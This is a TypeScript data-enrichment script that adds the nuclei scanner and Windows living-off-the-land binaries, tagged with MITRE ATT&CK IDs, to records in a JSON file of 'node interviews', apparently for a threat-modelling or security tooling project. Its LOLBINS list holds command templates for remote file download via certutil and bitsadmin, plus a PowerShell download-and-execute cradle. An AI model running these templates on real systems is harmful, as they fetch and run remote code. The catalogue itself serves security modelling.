import fs from "fs";
import path from "path";

const TARGET_FILE = path.join(process.cwd(), "src/data/node_interviews.json");

// --- Payload Definitions ---

const NUCLEI_TOOL = {
  tool_name: "nuclei",
  category: "Vulnerability Scanning",
  description: "Fast and customizable vulnerability scanner based on simple YAML based DSL.",
  command_template: "nuclei -u {target} -t {template}",
  alpine_container: "ctas7-nuclei-alpine:latest",
};

const LOLBINS = [
  {
    tool_name: "certutil",
    category: "Living Off The Land",
    description: "Windows binary used for certificate management, often abused for file downloads.",
    command_template: "certutil -urlcache -split -f {url} {output}",
    mitre_id: "T1105",
  },
  {
    tool_name: "bitsadmin",
    category: "Living Off The Land",
    description: "Windows generic background intelligence transfer service.",
    command_template: "bitsadmin /transfer myDownloadJob /download /priority normal {url} {output}",
    mitre_id: "T1197",
  },
  {
    tool_name: "powershell",
    category: "Scripting",
    description: "Task automation and configuration management framework.",
    command_template:
      "powershell -nop -c \"iex(new-object net.webclient).downloadstring('{url}')\"",
    mitre_id: "T1059.001",
  },
];

const MITRE_MAPPINGS: Record<string, string[]> = {
  "Ideological Formation": ["T1059", "T1105"], // Example mappings
  "Radical Exposure": ["T1566", "T1197"],
  // Add broad matching logic in the function
};

// --- Main Logic ---

function enrichData() {
  console.log(`Loading data from ${TARGET_FILE}...`);

  if (!fs.existsSync(TARGET_FILE)) {
    console.error("Target file does not exist!");
    process.exit(1);
  }

  const rawData = fs.readFileSync(TARGET_FILE, "utf-8");
  let interviews;
  try {
    interviews = JSON.parse(rawData);
  } catch (e) {
    console.error("Failed to parse JSON:", e);
    process.exit(1);
  }

  if (!Array.isArray(interviews)) {
    console.error("Expected JSON to be an array of interviews.");
    process.exit(1);
  }

  let modifiedCount = 0;

  interviews.forEach((interview: any) => {
    let modified = false;

    // 1. Inject Nuclei into "Scanning" or "Detect" phases
    const phase = interview.metadata?.hd4_phase || "";
    const desc = interview.identity?.description || "";

    // Logical heuristic for injection
    if (phase === "detect" || phase === "hunt" || desc.toLowerCase().includes("scan")) {
      if (!interview.kali_tools) interview.kali_tools = [];

      // Check if already exists to avoid dupes
      const hasNuclei = interview.kali_tools.some((t: any) => t.tool_name === "nuclei");
      if (!hasNuclei) {
        interview.kali_tools.push(NUCLEI_TOOL);
        modified = true;
      }
    }

    // 2. Inject LOLBINs into "Disrupt" or "Dominate" (Post-Exploitation)
    if (phase === "disrupt" || phase === "dominate") {
      if (!interview.kali_tools) interview.kali_tools = [];

      LOLBINS.forEach(lolbin => {
        const hasTool = interview.kali_tools.some((t: any) => t.tool_name === lolbin.tool_name);
        if (!hasTool) {
          interview.kali_tools.push(lolbin);
          modified = true;
        }
      });
    }

    // 3. Inject MITRE T-Codes
    if (!interview.tactical_profile) interview.tactical_profile = {};
    if (!interview.tactical_profile.mitre_attack) interview.tactical_profile.mitre_attack = [];

    // Simple enrichment based on LOLBIN injection or Phase
    if (modified) {
      LOLBINS.forEach(l => {
        if (!interview.tactical_profile.mitre_attack.includes(l.mitre_id)) {
          if (phase === "disrupt" || phase === "dominate") {
            interview.tactical_profile.mitre_attack.push(l.mitre_id);
          }
        }
      });
    }

    // Ensure standard MITRE fields exist
    if (interview.tactical_profile.mitre_attack.length === 0) {
      // Default fallback for usability
      if (phase === "hunt") interview.tactical_profile.mitre_attack.push("T1595"); // Active Scanning
      if (phase === "detect") interview.tactical_profile.mitre_attack.push("T1046"); // Network Service Scanning
      modified = true;
    }

    if (modified) modifiedCount++;
  });

  console.log(`Enriched ${modifiedCount} records.`);

  fs.writeFileSync(TARGET_FILE, JSON.stringify(interviews, null, 2));
  console.log("Write complete.");
}

enrichData();
